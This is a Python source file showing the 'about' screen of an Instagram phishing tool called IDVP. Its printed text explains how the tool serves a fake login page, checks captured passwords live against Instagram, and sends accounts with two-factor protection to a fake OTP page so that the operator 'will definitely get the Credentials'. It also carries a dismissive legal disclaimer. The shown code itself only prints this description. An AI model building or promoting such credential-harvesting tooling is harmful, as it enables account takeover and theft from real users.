import sys
import time 

def about():
    txt = '''\n\n\n
\033[93mVersion   : \033[96m1.0   
\033[93mDeveloper : \033[96mRobinHood
\033[93mGitHub    : \033[96mhttps://github.com/The-Robin-Hood

\033[93mLegal Disclaimer:\033[0m
- You never gonna listen to me if i say \033[31m"DO EDUCATIONAL PURPOSE ONLY"\033[0m
- Usage of IDVP for attacking targets without prior mutual consent is \033[31millegal.\033[0m
- Do fucking shit on your own

\033[93mRequest:\033[0m
- If you found any bugs or difficulties raise issue on Github
- Soon a article with detailed full working process will be published.

\033[93mAbout:\033[0m
- This Script Creates you a Instagram phishing page.
- Wait !!! So What is special about this script
- Here When Victim enters the Credentials rather than redirecting them to anyother site 
- Like usual Phishing script do.
- This script keeps the victim busy. While the script \033[32mCross Checks the Credentials.\033[0m
- If it was correct then the victim is redirected to instagram.com
- Else it agains reappears with alert of wrong username and password

\033[93mWhat If the Victim has Two Factor Authentication ?:\033[0m
- Again the script got your back,
- If victim has Two Factor Authentication then
- The script redirects the victim to a \033[32mFake OTP page\033[0m and again cross checks the OTP too.

\033[32mSo Finally you will definitely get the Credentials... \033[91m:) \033[0m \n'''
    
    for _ in txt:
        sys.stdout.write(_)
        sys.stdout.flush()
        time.sleep(0.01)

    val = input("\033[36m \n\n   Press \033[31m<return>\033[36m to continue\033[0m")
 
